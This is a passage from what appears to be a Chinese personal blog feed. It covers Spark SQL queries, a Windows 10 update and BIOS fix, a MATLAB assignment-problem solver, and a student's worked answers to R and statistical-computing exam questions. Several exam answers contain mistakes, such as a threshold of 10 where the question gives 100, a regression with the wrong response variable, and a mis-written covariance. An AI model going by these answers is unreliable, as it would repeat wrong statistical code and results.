class="hljs-keyword">FROM</span> employee<span class="hljs-string">");</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_03.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image006-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="61ab0ab0e4ee72618ab61f05ed7096b"></p><p> 4.查询age&gt;30的数据</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_04 = spark.sql("<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employee <span class="hljs-keyword">WHERE</span> age &gt; <span class="hljs-number">30</span><span class="hljs-string">")</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_04.show();</span></code></pre></div><p>​    </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image007-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593859876">]</p><p>5.age分组</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_05 = spark.sql("<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employee <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> age<span class="hljs-string">");</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_05.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image008-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593860554">]</p><p>6.name升序</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_06 = spark.sql("<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employee <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">name</span><span class="hljs-string">")</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_06.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image009-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593860597">]</p><p>​    </p><p> 7.前三行</p><p>sqlDF_07 = spark.sql(“SELECT * FROM employee”)</p><p>sqlDF_07.show(3);</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image010-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593861176"></p><p> 8.修改列名,name改成uersname</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_08 = spark.sql("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">AS</span> username <span class="hljs-keyword">FROM</span> employee<span class="hljs-string">")</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_08.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image011-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593861916"></p><p>9.查询age平均值</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_09 = spark.sql("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">AVG</span>(age) <span class="hljs-keyword">AS</span> ageAverage <span class="hljs-keyword">FROM</span> employee<span class="hljs-string">")</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_09.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image012-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593861967"></p><p> 10.查询age最小值</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_10 = spark.sql("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MIN</span>(age) <span class="hljs-keyword">AS</span> ageAverage <span class="hljs-keyword">FROM</span> employee<span class="hljs-string">")</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_10.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image013-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="1593862004">]</p><p>2．编程实现将RDD转换为DataFrame. （Scala）</p><div class="hljs code-wrapper"><pre><code class="hljs sql">import org.apache.spark.sql.catalyst.encoders.ExpressionEncoderimport org.apache.spark.sql.Encoderimport spark.implicits._ //导入包，支持把一个RDD隐式转换为一个DataFramecase class students_data(id:Int,name:String,gender:String,age:Int,course_id:Int,score:Double,classes:String) //定义一个case classval stuDF = spark.sparkContext.textFile("/FileStore/tables/students_data-7.txt").map(_.split(",")).map(t =&gt; students_data(t(0).trim.toInt, t(1), t(2), t(3).trim.toInt, t(4).trim.toInt, t(5).trim.toDouble, t(6))).toDF()stuDF.createOrReplaceTempView("stu") //必须注册为临时表才能供下面的查询val stuRDD = spark.sql("<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> stu<span class="hljs-string">")//最终生成一个DataFrame</span><span class="hljs-string"></span><span class="hljs-string">stuRDD.show()</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image015-1593878295756.jpg" srcset="/img/loading.gif" lazyload="" alt="1593869941">]</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10禁止更新以及BOIS更新</title>
      <link href="/2020/06/30/Win10%E7%A6%81%E6%AD%A2%E6%9B%B4%E6%96%B0%E4%BB%A5%E5%8F%8A%E8%BF%9E%E6%8E%A5%E9%80%82%E9%85%8D%E5%99%A8%E6%9B%B4%E6%96%B0/"/>
      <url>/2020/06/30/Win10%E7%A6%81%E6%AD%A2%E6%9B%B4%E6%96%B0%E4%BB%A5%E5%8F%8A%E8%BF%9E%E6%8E%A5%E9%80%82%E9%85%8D%E5%99%A8%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>记一次windows10更新遇到的坑，包括BOIS更新以及win10的grup启动</p><a id="more"></a><p>Windows更新历来都是挺坑，为了安全起见还是禁止更新吧</p><p>如果不幸更新了，特别是双系统更新了其中的Windows系统，需要连接下适配器（插上电源）更新一下BOIS系统</p><h3 id="win10禁止更新"><a href="#win10禁止更新" class="headerlink" title="win10禁止更新"></a>win10禁止更新</h3><p><kbd>我的电脑</kbd>-<kbd>管理</kbd>-<kbd>服务和应用程序</kbd>-<kbd>服务</kbd>-<kbd>Windows update</kbd>-<kbd>属性</kbd></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630210917021.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630210820858.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211029726.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211138616.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211153880.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="更新bois"><a href="#更新bois" class="headerlink" title="更新bois"></a>更新bois</h3><p>我更新之后打开windows出现了这种情况</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/f3718cfb498f195961ba28832f41ff2.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>显示 Check System Power Error , Please plug in AC Adapter.</p><p> 解决方法: <strong>连上电源(充电线)，重启</strong></p><p>然后就会出现</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/75d3b370a6f20fad27fe865a41169cd.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>然鹅，打开是这样的</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/32755925fc4ced850539d798ddc6d48.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>只要输入<code>exit</code>即可返回到正常的windows启动</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705185127776.png" srcset="/img/loading.gif" lazyload="" alt="image-20200705185127776"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指派问题求解</title>
      <link href="/2020/06/30/%E6%8C%87%E6%B4%BE%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3/"/>
      <url>/2020/06/30/%E6%8C%87%E6%B4%BE%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>运筹学中指派问题的求解</p><a id="more"></a><p>运筹学中的指派问题，这里并非用匈牙利法求解。其中C为效率矩阵。</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%适用于任意n阶系数矩阵</span>clear all；    C=[<span class="hljs-number">2</span> <span class="hljs-number">15</span> <span class="hljs-number">13</span> <span class="hljs-number">4</span>;<span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">14</span> <span class="hljs-number">15</span>;<span class="hljs-number">9</span> <span class="hljs-number">14</span> <span class="hljs-number">16</span> <span class="hljs-number">13</span>;<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">11</span> <span class="hljs-number">9</span>];<span class="hljs-comment">%效率矩阵C</span>    n=<span class="hljs-built_in">size</span>(C,<span class="hljs-number">1</span>);<span class="hljs-comment">%计算C的行列数n</span>    C=C(:);<span class="hljs-comment">%计算目标函数系数，将矩阵C按列排成一个列向量即可。</span>    A=[];B=[];<span class="hljs-comment">%没有不等式约束</span>    Ae=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">2</span>*n,n^<span class="hljs-number">2</span>);<span class="hljs-comment">%计算等约束的系数矩阵a</span>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*n+<span class="hljs-number">1</span>:n*<span class="hljs-built_in">i</span>    Ae(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)=<span class="hljs-number">1</span>;    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">for</span> k=<span class="hljs-built_in">i</span>:n:n^<span class="hljs-number">2</span>    Ae(n+<span class="hljs-built_in">i</span>,k)=<span class="hljs-number">1</span>;    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">end</span>    Be=<span class="hljs-built_in">ones</span>(<span class="hljs-number">2</span>*n,<span class="hljs-number">1</span>);<span class="hljs-comment">%等式约束右端项b</span>    Xm=<span class="hljs-built_in">zeros</span>(n^<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">%决策变量下界Xm</span>    XM=<span class="hljs-built_in">ones</span>(n^<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">%决策变量上界XM</span>    [x,z]=linprog(C,A,B,Ae,Be,Xm,XM);<span class="hljs-comment">%使用linprog求解</span>    x=<span class="hljs-built_in">reshape</span>(x,n,n);<span class="hljs-comment">%将列向量x按列排成一个n阶方阵</span>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">'最优解矩阵为:'</span>);<span class="hljs-comment">%输出指派方案和最优值</span>    Assignment=<span class="hljs-built_in">round</span>(x)<span class="hljs-comment">%使用round进行四舍五入取整</span>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">'最优解为:'</span>);    z</code></pre></div><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/hyc6668378/article/details/52403354?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">指派问题 MATLAB实现  hyc6668378</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
            <tag> 基础数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R语言试验上机考试</title>
      <link href="/2020/06/29/R%E8%AF%AD%E8%A8%80%E8%AF%95%E9%AA%8C%E4%B8%8A%E6%9C%BA%E8%80%83%E8%AF%95/"/>
      <url>/2020/06/29/R%E8%AF%AD%E8%A8%80%E8%AF%95%E9%AA%8C%E4%B8%8A%E6%9C%BA%E8%80%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>又是期末考哦</p><a id="more"></a><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>一、某单位招聘2500人，按考试成绩从高到低依次录用，共有10000人报名，假设报名者的成绩$X~N(u,\sigma^2)$ ，已知90分以上有359人，60分以有下1151人，问被录用者中最低分为多少？试用R软件相关函数功能计算。（15分）</p><p>二、已知20位学生的体重（单位：kg）如下：75.0， 64.5， 47.5， 66.9， 62.2，62.2, 58.7, 63.5, 66.7, 64.0, 57.8, 56.9, 50.2, 72.8, 65.3, 52.3,  63.6, 70.0, 63.9, 68.1 用R软件编程求学生体重的平均值、最大值、最小值、中位数。（10分）</p><p>三、美国联邦贸易委员会（FTC）每年根据焦油、尼古丁、一氧化碳的含量对国内烟草排名，美国调查机构一般认为这三种物质的第一种对吸烟者的健康都有害。过去的研究表明，香烟的焦油和尼古丁含量的增加通常伴随着烟雾释放一氧化碳的增加。表FTC2文件列出了某年测试的25个（过滤）品牌样本中焦油、尼古丁、一氧化碳含量（mg）与重量(g)的数据。假定要建立一氧化碳含量$y$ 与焦油含量$x_1$ 、尼古丁含量 $x_2$、与重量函数$x_3$的模型。用R软件和FTC2数据文件中的数据拟合模型$E(y)=\beta_0+\beta_1 x_1+\beta_2 x_2+\beta_3 x_3$，并检查是否存在共线性现象。（30分）  </p><p>四、环境保护署（EPA）对所有新车型推行广泛的测试以确定它们的行车里程等级（英里/加仑）。数据文件EPAGAS列出了某种新车型进行100次测试获得的行车里程等级数据。用R软件绘制直方图和QQ正态概率图，并判断数据是否服从近似正态分布。（30分）</p><p>五、利用$\frac{\pi}{4}=1-\frac{1}{3}+\frac{1}{5}-\frac{1}{7}-…$公式求$\frac{\pi}{4}$的近似值，直到最后一项的绝对值小于10-３为止。（15分）</p><h2 id="第一题答案"><a href="#第一题答案" class="headerlink" title="第一题答案"></a>第一题答案</h2><p><strong>1</strong>  程序</p><div class="hljs code-wrapper"><pre><code class="hljs r">x=matrix(c(<span class="hljs-number">1</span>,-<span class="hljs-number">1.2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1.8</span>),ncol=<span class="hljs-number">2</span>,nrow=<span class="hljs-number">2</span>,byrow=<span class="hljs-literal">T</span>);xx1=matrix(c(<span class="hljs-number">60</span>,<span class="hljs-number">90</span>),ncol=<span class="hljs-number">1</span>,nrow=<span class="hljs-number">2</span>,byrow=<span class="hljs-literal">T</span>);x1solve(x,x1)min=qnorm(<span class="hljs-number">0.75</span>)*<span class="hljs-number">10</span>+<span class="hljs-number">72</span>;min</code></pre></div><p><strong>2</strong>  程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM3NTQ5MDQucG5n?x-oss-process=image/format,png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>3</strong>  程序运行答案或结果解读</p><p>运行最终结果为78.7449</p><h2 id="第二题答案"><a href="#第二题答案" class="headerlink" title="第二题答案"></a>第二题答案</h2><p><strong>1</strong> 程序</p><div class="hljs code-wrapper"><pre><code class="hljs r">x2 &lt;- c(<span class="hljs-number">75.0</span>,<span class="hljs-number">64.5</span>, <span class="hljs-number">47.5</span>,<span class="hljs-number">66.9</span>,<span class="hljs-number">62.2</span>,<span class="hljs-number">62.2</span>, <span class="hljs-number">58.7</span>, <span class="hljs-number">63.5</span>, <span class="hljs-number">66.7</span>, <span class="hljs-number">64.0</span>, <span class="hljs-number">57.8</span>, <span class="hljs-number">56.9</span>, <span class="hljs-number">50.2</span>, <span class="hljs-number">72.8</span>, <span class="hljs-number">65.3</span>, <span class="hljs-number">52.3</span>, <span class="hljs-number">63.6</span>, <span class="hljs-number">70.0</span>, <span class="hljs-number">63.9</span>, <span class="hljs-number">68.1</span>) mean(x2)max(x2)min(x2)median(x2)</code></pre></div><p><strong>2</strong>  程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM4MjA3NjkucG5n?x-oss-process=image/format,png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>3</strong> 程序运行答案或结果解读</p><p>使用c()向x2赋值向量</p><p>mean( )函数求平均值</p><p>max( ) 函数求最大值</p><p>min( )函数求最小值</p><p>median( ) 函数求中位数</p><h2 id="第三题答案"><a href="#第三题答案" class="headerlink" title="第三题答案"></a>第三题答案</h2><p><strong>1</strong> 程序</p><div class="hljs code-wrapper"><pre><code class="hljs r">x3 &lt;- read.table(<span class="hljs-string">"D:/R/FTC2.txt"</span>,header=<span class="hljs-literal">T</span>,na.strings = c(<span class="hljs-string">"NA"</span>))lm.sol=lm(TAR~NICOTINE+WEIGHT+CO,data=x3)summary(lm.sol)XX3&lt;-cor(x3[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])kappa(XX3,exact=<span class="hljs-literal">TRUE</span>)</code></pre></div><p><strong>2</strong> 程序运行截屏</p><p> <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM5MTk4MDMucG5n?x-oss-process=image/format,png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>2）</strong> <strong>程序运行答案或结果解读</strong></p><div class="hljs code-wrapper"><pre><code class="hljs r">x3 &lt;- read.table(<span class="hljs-string">"D:/R/FTC2.txt"</span>,header=<span class="hljs-literal">T</span>,na.strings = c(<span class="hljs-string">"NA"</span>))</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs r"><span class="hljs-comment">#线性回归</span>lm.sol=lm(TAR~NICOTINE+WEIGHT+CO,data=x3)summary(lm.sol)</code></pre></div><p>得到拟合结果为y= -2.3696+ 10.0803<em>x1 + 0.1704</em>x2 + 0.4459 *x3<br>(x1~ NICOTINE ,x2~ WEIGHT,x3~ CO)</p><div class="hljs code-wrapper"><pre><code class="hljs r">XX3&lt;-cor(x3[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])kappa(XX3,exact=<span class="hljs-literal">TRUE</span>)   <span class="hljs-comment">#exact=TRUE表示精确计算条件数；</span></code></pre></div><p>运行结果为189.7185 ，远小于1000则可认为不存在共线性现象。 </p><h2 id="第四题答案"><a href="#第四题答案" class="headerlink" title="第四题答案"></a>第四题答案</h2><p><strong>1</strong> 程序</p><div class="hljs code-wrapper"><pre><code class="hljs r">x4 &lt;- read.table(<span class="hljs-string">"D:/R/EPAGAS.txt"</span>,header=<span class="hljs-literal">T</span>,na.strings = c(<span class="hljs-string">"NA"</span>))hist(x4$MPG)qqnorm(x4$MPG)shapiro.test(x4$MPG)<span class="hljs-comment">#检验数据是否符合正态分布</span></code></pre></div><p><strong>2</strong> 程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzQxMjkxODIucG5n?x-oss-process=image/format,png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>3</strong> 程序运行答案或结果解读</p><div class="hljs code-wrapper"><pre><code class="hljs r">x4 &lt;- read.table(<span class="hljs-string">"D:/R/EPAGAS.txt"</span>,header=<span class="hljs-literal">T</span>,na.strings = c(<span class="hljs-string">"NA"</span>))读入存储为一个数据框 x4$MPG为选取数据框MPG列 hist(x4$MPG)           <span class="hljs-comment">#画出直方图</span>qqnorm(x4$MPG)         <span class="hljs-comment">#画出qq图</span>shapiro.test(x4$MPG)    <span class="hljs-comment">#正态分布检验</span><span class="hljs-comment">#p值大于0.05，所以数据为正态分布</span></code></pre></div><h2 id="第五题答案"><a href="#第五题答案" class="headerlink" title="第五题答案"></a>第五题答案</h2><p>*<em>1 *</em> 程序</p><div class="hljs code-wrapper"><pre><code class="hljs r">f=<span class="hljs-keyword">function</span>(n){sum=<span class="hljs-number">0</span>a=<span class="hljs-number">1</span>b=<span class="hljs-number">1</span><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>:n){sum=sum+a/ba=-ab=b+<span class="hljs-number">2</span>}sum}  f(<span class="hljs-number">501</span>)</code></pre></div><p><strong>2</strong>  程序运行截屏</p><p> <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzQyNDkwNDYucG5n?x-oss-process=image/format,png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>3</strong>  程序运行答案或结果解读</p><p>首先定义函数</p><div class="hljs code-wrapper"><pre><code class="hljs r">f=<span class="hljs-keyword">function</span>(n){sum=<span class="hljs-number">0</span>a=<span class="hljs-number">1</span>b=<span class="hljs-number">1</span><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>:n){sum=sum+a/ba=-ab=b+<span class="hljs-number">2</span>}sum}</code></pre></div><p>再调用</p><div class="hljs code-wrapper"><pre><code class="hljs r">f(<span class="hljs-number">501</span>)</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计计算方法上机考试</title>
      <link href="/2020/06/25/%E7%BB%9F%E8%AE%A1%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%E4%B8%8A%E6%9C%BA%E8%80%83%E8%AF%95/"/>
      <url>/2020/06/25/%E7%BB%9F%E8%AE%A1%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%E4%B8%8A%E6%9C%BA%E8%80%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>统计计算方法期末上级实验</p><a id="more"></a><p><strong>1.</strong> 设X服从正态分布N(1,4)，用R计算Pr(X&lt;1.5)。</p><p><strong>2.</strong> 为了估计E(X)，X1,X2,…,X9已经被模拟出，其数据如下：</p><p>11，222，99，33，90，22，33，22，83</p><p>再根据这些数据，如果我们要使E(X)的估计量的标准差小于0.01，大概还需要运行多少次？</p><p><strong>3.</strong> 用对偶模拟方法计算$Cov(U,e^U)$,其中U是(0,1)上的均匀随机变量,并要求它的方差和一般随机模拟方法的方差做比较。</p><p><strong>4.</strong>  用条件期望抽样法估计$\theta = E(W_1+W_2)^{\frac{1}{3}}$，其中$W_1,W_2$是独立同分布的参数为2的指数分布,并要求它的方差和一般随机模拟方法的方差做比较。</p><p><strong>5.</strong> 假设公共汽车数服从Poisson分布（$\lambda=2$），每辆公共汽车等可能地包含20，21，——-，30个运动爱好者，在不同公共汽车中运动爱好者的人数是独立的。写一个算法来模拟这些运动爱好者的达到人数超过100的概率。</p><ul><li><div class="hljs code-wrapper"><pre><code class="hljs r">pnorm(<span class="hljs-number">1.5</span>,mean=<span class="hljs-number">1</span>,sd=<span class="hljs-number">2</span>,lower.tail=<span class="hljs-literal">TRUE</span>)</code></pre></div></li></ul><ul><li><div class="hljs code-wrapper"><pre><code class="hljs r"><span class="hljs-literal">F</span>=<span class="hljs-keyword">function</span>(d){     x=c(<span class="hljs-number">11</span>,<span class="hljs-number">222</span>,<span class="hljs-number">99</span>,<span class="hljs-number">33</span>,<span class="hljs-number">90</span>,<span class="hljs-number">22</span>,<span class="hljs-number">33</span>,<span class="hljs-number">22</span>,<span class="hljs-number">83</span>)     k=<span class="hljs-number">9</span>     <span class="hljs-keyword">while</span>(sd(x)/sqrt(length(x))&gt;=d){         k=k+<span class="hljs-number">1</span>          x[k]=rnorm(<span class="hljs-number">1</span>)         }     k-<span class="hljs-number">1</span>     }  <span class="hljs-literal">F</span>(<span class="hljs-number">0.01</span>)</code></pre></div></li></ul><ul><li><div class="hljs code-wrapper"><pre><code class="hljs r">n&lt;-1000ru&lt;-runif(n)y1&lt;-uy2&lt;-exp(u)y&lt;-c(y1,y2)use&lt;-mean(y)usecov&lt;-mean(u+exp(u))-use^<span class="hljs-number">2</span>cov</code></pre></div></li></ul><ul><li><div class="hljs code-wrapper"><pre><code class="hljs r">F4=<span class="hljs-keyword">function</span>(n){a=rep(<span class="hljs-number">0</span>,n)<span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>:n){X=runif(<span class="hljs-number">1000</span>)Y=runif(<span class="hljs-number">1000</span>)f=<span class="hljs-keyword">function</span>(x,y)(((<span class="hljs-number">2</span>*exp(-<span class="hljs-number">2</span>*x))+(<span class="hljs-number">2</span>*exp(-<span class="hljs-number">2</span>*y)))**(<span class="hljs-number">1</span>/<span class="hljs-number">3</span>))a[i]=sum(f(X,Y))/<span class="hljs-number">1000</span>}list(a=mean(a),VAR=var(a))}F4(<span class="hljs-number">50</span>)</code></pre></div></li></ul><ul><li><div class="hljs code-wrapper"><pre><code class="hljs r">F5=<span class="hljs-keyword">function</span>(n){k=<span class="hljs-number">0</span>X=c(<span class="hljs-number">20</span>:<span class="hljs-number">30</span>)p=rep(<span class="hljs-number">1</span>/<span class="hljs-number">11</span>,<span class="hljs-number">11</span>)<span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>:n){Y=rpois(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)x=sample(X,Y,p,replace=<span class="hljs-literal">TRUE</span>)   <span class="hljs-keyword">if</span>(sum(x)&gt;<span class="hljs-number">10</span>)        k=k+<span class="hljs-number">1</span>}k/n}F5(<span class="hljs-number">1000</span>)</code></pre></div></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop HDFS使用指南</title>
      <link href="/2020/06/25/Hadoop-HDFS%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2020/06/25/Hadoop-HDFS%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
